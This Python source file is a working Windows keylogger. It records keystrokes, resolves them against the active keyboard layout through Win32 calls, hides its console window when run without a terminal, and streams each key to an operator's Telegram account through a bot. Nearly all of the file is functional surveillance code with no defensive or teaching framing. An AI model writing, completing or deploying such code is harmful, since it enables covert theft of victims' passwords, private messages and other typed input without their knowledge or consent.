import ctypes
import os
import sys
import threading
import time
from ctypes import wintypes
from queue import Empty, Queue
from typing import Optional

from dotenv import load_dotenv
import telebot
from pynput import keyboard

load_dotenv()

BOT_TOKEN = os.getenv("LOGGER_BOT_TOKEN", "")
TARGET_USER_ID = os.getenv("LOGGER_TARGET_USER_ID", "")

if not BOT_TOKEN or not TARGET_USER_ID:
    raise RuntimeError(
        "Заполните LOGGER_BOT_TOKEN и LOGGER_TARGET_USER_ID в .env перед запуском"
    )

bot = telebot.TeleBot(BOT_TOKEN, parse_mode=None)
stop_event = threading.Event()
send_queue: Queue[str] = Queue()


@bot.message_handler(commands=["start"])
def start(message):
    chat = getattr(message, "chat", None)
    if chat is None or str(getattr(chat, "id", "")) != str(TARGET_USER_ID):
        return
    bot.send_message(chat.id, "Я сервер-бот. Клавиши будут приходить сюда.")


@bot.message_handler(commands=["stop"])
def stop(message):
    chat = getattr(message, "chat", None)
    if chat is None or str(getattr(chat, "id", "")) != str(TARGET_USER_ID):
        return
    if stop_event.is_set():
        return
    stop_event.set()
    send_queue.put(None)
    bot.stop_polling()
    bot.send_message(chat.id, "Останавливаем сервер")


_user32 = None
_kernel32 = None
if sys.platform == "win32":
    _user32 = ctypes.WinDLL("user32", use_last_error=True)
    _kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
    _user32.GetForegroundWindow.restype = wintypes.HWND
    _user32.GetForegroundWindow.argtypes = []
    _user32.GetWindowThreadProcessId.restype = wintypes.DWORD
    _user32.GetWindowThreadProcessId.argtypes = [wintypes.HWND, ctypes.POINTER(wintypes.DWORD)]
    _user32.GetKeyboardLayout.restype = wintypes.HKL
    _user32.GetKeyboardLayout.argtypes = [wintypes.DWORD]
    _user32.MapVirtualKeyW.restype = wintypes.UINT
    _user32.MapVirtualKeyW.argtypes = [wintypes.UINT, wintypes.UINT]
    _user32.GetKeyboardState.restype = wintypes.BOOL
    _user32.GetKeyboardState.argtypes = [ctypes.POINTER(ctypes.c_uint8)]
    _user32.GetKeyState.restype = ctypes.c_short
    _user32.GetKeyState.argtypes = [wintypes.INT]
    _user32.ToUnicodeEx.restype = ctypes.c_int
    _user32.ToUnicodeEx.argtypes = [
        wintypes.UINT,
        wintypes.UINT,
        ctypes.POINTER(ctypes.c_uint8),
        ctypes.c_void_p,
        ctypes.c_int,
        wintypes.UINT,
        wintypes.HKL,
    ]
    _kernel32.GetConsoleWindow.restype = wintypes.HWND
    _kernel32.GetConsoleWindow.argtypes = []
    _user32.ShowWindow.restype = wintypes.BOOL
    _user32.ShowWindow.argtypes = [wintypes.HWND, ctypes.c_int]


def _get_active_keyboard_layout() -> wintypes.HKL:
    if _user32 is None:
        return wintypes.HKL(0)

    foreground_window = _user32.GetForegroundWindow()
    if foreground_window:
        process_id = wintypes.DWORD()
        thread_id = _user32.GetWindowThreadProcessId(
            foreground_window, ctypes.byref(process_id)
        )
        if thread_id:
            layout = _user32.GetKeyboardLayout(thread_id)
            if layout:
                return layout
    return _user32.GetKeyboardLayout(0)


def _populate_key_state_from_get_key_state(
    keyboard_state: "ctypes.Array[ctypes.c_uint8]", virtual_key: int
):
    if _user32 is None:
        return

    state = _user32.GetKeyState(virtual_key)
    pressed = 0x80 if state & 0x8000 else 0
    toggled = 0x01 if state & 0x0001 else 0
    keyboard_state[virtual_key] = pressed | toggled


_MODIFIER_VIRTUAL_KEYS = [
    0x10,  # VK_SHIFT
    0x11,  # VK_CONTROL
    0x12,  # VK_MENU (ALT)
    0x14,  # VK_CAPITAL (CAPS LOCK)
    0xA0,  # VK_LSHIFT
    0xA1,  # VK_RSHIFT
    0xA2,  # VK_LCONTROL
    0xA3,  # VK_RCONTROL
    0xA4,  # VK_LMENU
    0xA5,  # VK_RMENU
]

_VK_NUMPAD_DIGITS = {0x60 + digit: str(digit) for digit in range(10)}


def _fallback_printable_from_vk(key_code: keyboard.KeyCode) -> Optional[str]:
    vk = getattr(key_code, "vk", None)
    if vk is None:
        return None

    if 0x30 <= vk <= 0x39:
        return chr(vk)
    if 0x41 <= vk <= 0x5A:
        return chr(vk).lower()

    numpad = _VK_NUMPAD_DIGITS.get(vk)
    if numpad:
        return numpad

    numpad_ops = {
        0x6A: "*",
        0x6B: "+",
        0x6D: "-",
        0x6E: ".",
        0x6F: "/",
    }
    if vk in numpad_ops:
        return numpad_ops[vk]

    oem_mapping = {
        0xBA: ";",
        0xBB: "=",
        0xBC: ",",
        0xBD: "-",
        0xBE: ".",
        0xBF: "/",
        0xC0: "`",
        0xDB: "[",
        0xDC: "\\",
        0xDD: "]",
        0xDE: "'",
        0xDF: "#",
    }
    if vk in oem_mapping:
        return oem_mapping[vk]

    return None


def _translate_keycode_windows(key_code: keyboard.KeyCode) -> Optional[str]:
    if _user32 is None:
        return None

    vk = getattr(key_code, "vk", None)
    if vk is None:
        return None

    scan_code = _user32.MapVirtualKeyW(vk, 0)
    if scan_code == 0:
        return None

    keyboard_state = (ctypes.c_uint8 * 256)()
    if not _user32.GetKeyboardState(keyboard_state):
        for virtual_key in range(256):
            _populate_key_state_from_get_key_state(keyboard_state, virtual_key)
    else:
        for virtual_key in _MODIFIER_VIRTUAL_KEYS:
            _populate_key_state_from_get_key_state(keyboard_state, virtual_key)

    buffer = ctypes.create_unicode_buffer(8)
    layout = _get_active_keyboard_layout()

    keyboard_state[vk] = keyboard_state[vk] | 0x80
    result = _user32.ToUnicodeEx(
        vk,
        scan_code,
        keyboard_state,
        buffer,
        len(buffer),
        0,
        layout,
    )

    if result == -1:
        _user32.ToUnicodeEx(
            vk,
            scan_code,
            keyboard_state,
            buffer,
            len(buffer),
            0,
            layout,
        )
        return None

    if result > 0:
        return buffer.value[:result]

    return None


def key_to_str(key):
    if key in {
        keyboard.Key.shift,
        keyboard.Key.shift_r,
        keyboard.Key.alt,
        keyboard.Key.alt_gr,
        keyboard.Key.alt_l,
        keyboard.Key.alt_r,
        keyboard.Key.ctrl,
        keyboard.Key.ctrl_l,
        keyboard.Key.ctrl_r,
    }:
        return None
    if key == keyboard.Key.enter:
        return "\n"
    if key == keyboard.Key.backspace:
        return "\b"
    if key == keyboard.Key.tab:
        return "\t"
    if key == keyboard.Key.space:
        return " "
    if isinstance(key, keyboard.KeyCode):
        translated = _translate_keycode_windows(key)
        if translated:
            return translated
        if key.char:
            return key.char
        fallback = _fallback_printable_from_vk(key)
        if fallback:
            return fallback
    return None


def _hide_console_window():
    if sys.platform != "win32":
        return
    stdin = getattr(sys, "stdin", None)
    if stdin is not None and hasattr(stdin, "isatty") and stdin.isatty():
        return
    if _user32 is None or _kernel32 is None:
        return
    hwnd = _kernel32.GetConsoleWindow()
    if hwnd:
        _user32.ShowWindow(hwnd, 0)


def _send_worker():
    while not stop_event.is_set():
        try:
            payload = send_queue.get(timeout=0.5)
        except Empty:
            continue
        if payload is None:
            break
        try:
            bot.send_message(TARGET_USER_ID, payload)
        except Exception:
            time.sleep(1)


def on_press(key):
    if stop_event.is_set():
        return False
    key_str = key_to_str(key)
    if key_str is None:
        return True
    send_queue.put(key_str)
    return True


def _run_bot_polling():
    while not stop_event.is_set():
        try:
            bot.infinity_polling(timeout=10, long_polling_timeout=30)
        except Exception:
            if stop_event.is_set():
                break
            time.sleep(3)
        else:
            break


def main():
    _hide_console_window()

    sender = threading.Thread(target=_send_worker, daemon=True)
    sender.start()

    bot_thread = threading.Thread(target=_run_bot_polling, daemon=True)
    bot_thread.start()

    listener = keyboard.Listener(on_press=on_press)
    listener.start()

    try:
        while not stop_event.wait(0.2):
            pass
    except KeyboardInterrupt:
        stop_event.set()
        send_queue.put(None)
    finally:
        listener.stop()
        listener.join()
        bot.stop_polling()
        bot_thread.join()
        send_queue.put(None)
        sender.join()


if __name__ == "__main__":
    main()
